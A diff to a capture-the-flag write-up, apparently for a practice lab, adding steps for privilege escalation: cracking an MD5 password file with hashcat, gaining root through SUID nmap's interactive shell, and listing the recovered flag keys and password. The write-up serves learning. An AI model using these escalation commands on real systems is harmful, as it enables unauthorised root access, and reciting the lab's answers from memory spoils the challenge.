@@ -77,6 +77,50 @@ Triggered by visiting the 404.php file. Shell obtained.
 
 ---
 
-## To Be Continued
 
-Keys 2 and 3 — privilege escalation. Resuming next session.
+## Key 2 — Privilege Escalation to Robot
+
+Found a password file readable by everyone in robot's home directory.
+
+```bash
+cat /home/robot/password.raw-md5
+```
+
+Cracked the MD5 hash with hashcat:
+
+```bash
+hashcat -m 0 c3fcd3d76192e4007dfb496cca67e13b /usr/share/wordlists/rockyou.txt
+```
+
+**Password found:** abcdefghijklmnopqrstuvwxyz
+
+Switched to robot user and read key 2.
+
+**Key 2:** `822c73956184f694993bede3eb39f959`
+
+---
+
+## Key 3 — Root via SUID Nmap
+
+Found nmap with SUID bit set — runs as root.
+
+```bash
+find / -perm -u=s -type f 2>/dev/null
+nmap --interactive
+!sh
+```
+
+Got a root shell. Read the final key.
+
+**Key 3:** `04787ddef27c3dee1ee161b21670b4e4`
+
+---
+
+## What I learned
+
+- robots.txt always worth checking
+- WordPress username enumeration via error messages
+- Hydra brute force on web forms
+- PHP reverse shell via theme editor
+- MD5 cracking with hashcat
+- SUID binary exploitation for privilege escalation
